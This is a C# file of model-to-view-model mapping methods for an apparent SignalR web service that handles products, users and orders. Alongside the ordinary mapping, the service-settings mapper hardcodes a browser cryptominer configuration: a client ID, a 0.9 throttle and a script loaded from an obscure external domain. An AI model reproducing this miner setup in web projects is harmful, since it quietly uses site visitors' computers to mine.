using SignalRService.Models;
using SignalRService.ViewModels;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;

namespace SignalRService.Utils
{
    public static class ModelExtensinos
    {
        public static ServiceSettingViewModel ToServiceSettingViewModel(this ServiceSettingModel dbmodel )
        {
            return new ServiceSettingViewModel()
            {
                Id = dbmodel.ID,
                ServiceName = dbmodel.ServiceName,
                ServiceUrl = dbmodel.ServiceUrl,
                ServiceType = dbmodel.ServiceType.ToString(),
                MinerConfigurationViewModel = new SignalRService.ViewModels.MinerConfigurationViewModel()
                {
                    ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
                    Throttle = "0.9",
                    ScriptUrl = "https://www.freecontent.stream./Htxj.js",
                    StartDelayMs = 3000,
                    ReportStatusIntervalMs = 65000
                },
                SiganlRBaseConfigurationVieModel = new SignalRService.ViewModels.SignalRBaseConfigurationViewModel()
                {
                    SinalRGroup = dbmodel.ServiceUrl.ToLower()
                },
                OrderClientConfigurationViewModel = new SignalRService.ViewModels.OrderClientConfigurationViewModel()
                {
                    //  AppendToSelector = "*[data-role=page]"
                    AppendToSelector = ".body-content",
                    SinalRGroup = dbmodel.ServiceUrl.ToLower()
                },
                OrderHostConfigurationViewModel = new SignalRService.ViewModels.OrderHostConfigurationViewModel()
                {
                    AppendToSelector = ".body-content",
                    SinalRGroup = dbmodel.ServiceUrl.ToLower()
                }
            };
        }

        public static Hubs.ProductData ToHtmlEncode(this Hubs.ProductData model)
        {
            return new Hubs.ProductData()
            {
                Id = HttpUtility.HtmlEncode(model.Id),
                Name = HttpUtility.HtmlEncode(model.Name),
                Description = HttpUtility.HtmlEncode(model.Description),
                ImgUrl = HttpUtility.HtmlEncode(model.ImgUrl),
                Price = model.Price
            };
        }

        public static ViewModels.UserDataViewModel ToUserDataViewModel(this Models.UserDataModel model)
        {
            var vm = new UserDataViewModel();
            if(model == null)
            {
                model = new UserDataModel();
                model.ID = 0;
                model.IdentityName = "Undefined";
            }
            vm.Id = model.ID;
            vm.Name = model.IdentityName;
            vm.SignalRConnections = model.SignalRConnections.Select(x => x.SignalRConnectionId).ToList();
            return vm;
            
        }

        public static List<ProductViewModel> ToProductViewModels(this List<Models.ProductModel> models)
        {
            List<ProductViewModel> retlist = new List<ProductViewModel>();
            foreach(var item in models)
            {
                retlist.Add(item.ToProductViewModel());
            }
            return retlist;
        }

        public static ProductViewModel ToProductViewModel(this Models.ProductModel model)
        {
            return new ProductViewModel() {
                 Id = model.ID,
                 Description = model.Description,
                 Name = model.Name,
                 OwnerId = model.Owner.ID,
                 PartNumber = model.PartNo,
                 Price = model.Price
            };
        }

        public static ViewModels.OrderViewModel ToOrderViewModel(this Models.OrderModel model)
        {
            var vm = new ViewModels.OrderViewModel() {
                CustomerUser = model.CustomerUser != null ? model.CustomerUser.ToUserDataViewModel() : new UserDataViewModel(),
                StoreUser = model.StoreUser != null ? model.StoreUser.ToUserDataViewModel(): new UserDataViewModel(),
                OrderIdentifier = model.OrderIdentifier,
                OrderState = model.OrderState,
                OrderType = model.OrderType,
                Items = new List<OrderItemViewModel>()
            };
            foreach(var item in model.Items)
            {
                vm.Items.Add(item.ToOrderItemViewModel());
            }
            return vm;
        }

        public static ViewModels.OrderItemViewModel ToOrderItemViewModel(this Models.OrderItemModel model)
        {
            return new OrderItemViewModel()
            {
                Id = model.ID,
                // Description = model.Name
                Name = model.Name,
                PartNumber = model.PartNo,
                Price = model.Price,
                OwnerId = model.Order.StoreUser.ID,
                Amount = model.Amount
            };
        }

       


    }
}